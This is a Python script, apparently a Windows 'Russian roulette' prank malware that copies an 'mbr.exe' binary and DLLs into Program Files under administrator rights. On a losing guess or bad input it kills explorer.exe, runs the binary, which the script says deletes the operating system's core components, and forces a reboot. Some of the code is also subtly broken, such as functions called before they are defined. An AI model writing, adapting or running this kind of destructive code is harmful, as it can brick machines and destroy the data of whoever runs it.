import random
import os
import ctypes
import time
from string import digits
import sys
import shutil

number = random.randint(1,6)
kill = "taskkill /f /im explorer.exe"
mbr = "C:\Program Files\pussianroulette\mbr.exe"
wait = 5
reboot = 'shutdown /r /f /c "LOOOOOL" /t 5'
logo = """

██████╗░██╗░░░██╗░██████╗░██████╗██╗░█████╗░███╗░░██╗
██╔══██╗██║░░░██║██╔════╝██╔════╝██║██╔══██╗████╗░██║
██████╔╝██║░░░██║╚█████╗░╚█████╗░██║███████║██╔██╗██║
██╔══██╗██║░░░██║░╚═══██╗░╚═══██╗██║██╔══██║██║╚████║
██║░░██║╚██████╔╝██████╔╝██████╔╝██║██║░░██║██║░╚███║
╚═╝░░╚═╝░╚═════╝░╚═════╝░╚═════╝░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

██████╗░░█████╗░██╗░░░██╗██╗░░░░░███████╗████████╗████████╗███████╗
██╔══██╗██╔══██╗██║░░░██║██║░░░░░██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝
██████╔╝██║░░██║██║░░░██║██║░░░░░█████╗░░░░░██║░░░░░░██║░░░█████╗░░
██╔══██╗██║░░██║██║░░░██║██║░░░░░██╔══╝░░░░░██║░░░░░░██║░░░██╔══╝░░
██║░░██║╚█████╔╝╚██████╔╝███████╗███████╗░░░██║░░░░░░██║░░░███████╗
╚═╝░░╚═╝░╚════╝░░╚═════╝░╚══════╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚══════╝

"""

def isAdmin():
	global wait
	try:
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
	except AttributeError:
		while wait != 0:
			print("This program only works on Microsoft Windows machines. Quitting in " + str(wait) + " seconds.")
			time.sleep(1)
			wait -= 1
		quit()
	return is_admin

def idiot():
	os.system("cls")
	print("\nSeems like you can't follow simple instructions... let's see what happens now.")
	os.system(kill)
	os.system(mbr)
	os.system(reboot)
	quit()

if isAdmin():
	pass
else:
	while wait != 0:
		print("Run this program with administrator privileges. Quitting in " + str(wait) + " seconds.")
		time.sleep(1)
		wait -= 1
		os.system("cls")
	quit()

def pfdelete():
	os.remove("C:/Program Files/pussianroulette/mbr.exe")
	os.remove("C:/Program Files/pussianroulette/api-ms-win-core-path-l1-1-0.dll")
	os.remove("C:/Program Files/pussianroulette/msvcp140d.dll")
	os.remove("C:/Program Files/pussianroulette/ucrtbased.dll")
	os.remove("C:/Program Files/pussianroulette/vcruntime140_1d.dll")
	os.rmdir("C:/Program Files/pussianroulette/")

os.mkdir("C:/Program Files/pussianroulette")
shutil.copy2("temp/mbr.exe", "C:/Program Files/pussianroulette")
shutil.copy2("temp/api-ms-win-core-path-l1-1-0.dll", "C:/Program Files/pussianroulette")
shutil.copy2("temp/msvcp140d.dll", "C:/Program Files/pussianroulette")
shutil.copy2("temp/ucrtbased.dll", "C:/Program Files/pussianroulette")
shutil.copy2("temp/vcruntime140_1d.dll", "C:/Program Files/pussianroulette")

def quit():
	pfdelete()
	sys.exit()

def confirm():
	confirm =  input("Do you want to play a game? This program IS MALWARE and WILL MAKE YOUR COMPUTER UNUSABLE! (yes/no)\n")
	confirm = confirm.lower()
	if confirm == "no":
		os.system("cls")
		quit()
	elif confirm == "yes":
		os.system("cls")
	else:
		confirm()

confirm()

def sure():
	sure = input("""\nAre you TOTALLY sure? This program WILL delete your operating system's core components!!\n
	THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR UNUSABLE OR BRICKED MACHINES! RUN AT YOUR OWN RISK! (yes/no)\n""")
	sure = sure.lower()
	if sure == "no":
		os.system("cls")
		quit()
	elif sure == "yes":
		os.system("cls")
	else:
		sure()

sure()

print(logo)
guess = input("Let's play a game of russian roulette! Type a number between 1 and 6...\n")

# if set(guess).difference(digits):
	# idiot()

try:
	guess = int(guess)
except ValueError:
	idiot()

if guess > 6 or guess <= 0:
	idiot()
elif guess == number:
	os.system("cls")
	print("\n You lost. Get lost.")
	os.system(kill)
	os.system(mbr)
	os.system(reboot)
else:
	os.system("cls")
	print("\nYou won! Now get out of my face.")
	input("Press ENTER to quit...")
	quit()
